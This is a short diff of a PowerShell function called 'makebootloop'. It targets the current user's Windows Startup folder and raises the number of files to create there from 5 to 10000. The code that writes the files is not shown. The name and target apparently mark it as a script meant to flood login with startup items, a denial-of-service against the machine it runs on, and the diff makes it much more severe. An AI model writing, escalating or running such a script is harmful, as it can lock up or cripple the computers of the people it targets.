@@ -4,7 +4,7 @@ function makebootloop {
         [string]$Path = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
         
         # How many files do you want to create?
-        [int]$Count = 5
+        [int]$Count = 10000
     )
 
     process {
